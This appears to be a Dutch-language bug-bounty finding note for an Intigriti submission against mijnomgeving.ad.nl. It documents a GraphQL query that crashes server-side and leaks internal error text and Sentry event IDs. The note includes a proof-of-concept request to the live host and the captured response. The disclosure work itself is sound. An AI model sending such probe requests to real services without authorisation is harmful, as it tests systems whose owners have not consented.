# AD.nl — Server-Side Error in getSharedAccessOverview

**Target:** mijnomgeving.ad.nl  
**Severity:** Medium  
**Status:** Klaar voor submission  
**Datum:** 2026-06-02  
**Bounty verwacht:** €50 (Tier 3)

## CVSS
`AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` — Score: 5.3

## Beschrijving
De `getSharedAccessOverview` GraphQL query crasht server-side voor elke subscriptionId en lekt interne Sentry event IDs.

## PoC Request
```http
GET /api/graphql?variables={"brandId":"ad","subscriptionId":"100000"}&extensions={"persistedQuery":{"sha256Hash":"0b06a5b46615e9e404b1cd2cf54873b3c26d48801e2c2502211882eea2893028","version":1}}
Host: mijnomgeving.ad.nl
X-Intigriti-Username: smdjack
Cookie: [session]
```

## Response
```json
{
  "errors": [{
    "message": "f?.some is not a function",
    "path": ["getSharedAccessOverview"],
    "extensions": {"sentryEventId": "7944c97a89de463481f1ca8f69eb00cd"}
  }],
  "data": {"__typename": "Query", "getSharedAccessOverview": null}
}
```

## Impact
- Interne error details gelekt (`f?.some is not a function`)
- Sentry event IDs exposed
- Geen authorization check op subscriptionId

## Links
- [[AD.nl - DPG Media]]
- [[AD.nl - GraphQL API]]
- [[AD.nl - Intigriti Submission]]
